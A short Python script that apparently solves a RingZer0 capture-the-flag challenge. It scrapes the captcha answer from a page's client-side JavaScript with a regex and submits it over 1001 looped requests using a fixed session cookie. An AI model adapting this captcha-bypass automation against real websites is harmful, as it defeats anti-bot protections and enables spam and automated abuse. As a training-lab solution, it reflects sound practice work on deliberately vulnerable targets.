import re
import time
from requests import get, post

cookies = dict(PHPSESSID='224n2deq9j348figknnov5ful3')
headers = {'Origin': 'http://captcha.ringzer0team.com:10138',
           'Referer': 'http://captcha.ringzer0team.com:10138/form1.php',
           'Content-Type': 'application/x-www-form-urlencoded'}

url_get = "http://challenges.ringzer0team.com:10138/form1.php"
url_post = "http://challenges.ringzer0team.com:10138/captcha1.php"

for i in range(1001):
    time.sleep(0.10)
    html = get(url_get, cookies=cookies).content
    m = re.search(b'if \(A == \"(\w+)\"\)\{', html).group(1)
    payload = ('captcha=%s' % m)
    html = post(url_post, cookies=cookies, data=payload, headers=headers).content
    print('POINTS: %s' % i)

print(html)
